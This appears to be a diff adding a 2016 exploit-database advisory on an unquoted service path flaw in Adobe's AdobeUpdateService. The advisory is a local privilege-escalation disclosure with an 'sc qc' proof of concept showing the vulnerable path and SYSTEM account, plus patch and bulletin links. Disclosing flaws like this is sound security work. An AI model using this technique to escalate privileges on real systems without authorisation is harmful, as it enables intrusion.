@@ -1,0 +1,43 @@
+----------------------------------------------------------------------------------------------------------
+# Exploit Title:  AdobeUpdateService  - Privilege Escalation Unquoted Service Path vulnerability
+# Date: 18/05/2016
+# Exploit Author : Cyril Vallicari
+# Vendor Homepage: http://www.adobe.com/fr/
+# Software Link:  http://www.adobe.com/downloads.html
+# Version:  3.6.0.248
+# Tested on: Windows 7 x64 SP1 (but it should works on all windows version)
+
+
+The application suffers from an unquoted search path issue impacting the service 'AdobeUpdateService' for Windows deployed as part of Adobe Creative Cloud
+
+This could potentially allow an authorized but non-privileged local user to execute arbitrary code with system privileges on the system.
+
+POC :
+
+
+C:\Users\Utilisateur>sc qc AdobeUpdateService
+
+[SC] QueryServiceConfig réussite(s)
+
+SERVICE_NAME: AdobeUpdateService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Common Files\Adobe\Adobe Desktop Common\ElevationManager\AdobeUpdateService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : AdobeUpdateService
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+
+
+Video POC : https://www.youtube.com/watch?v=RyzYkd05xM4
+
+Patch :
+
+Fixed in version 3.7.0.271
+
+Additional notes :
+
+https://helpx.adobe.com/security/products/creative-cloud/apsb16-21.html
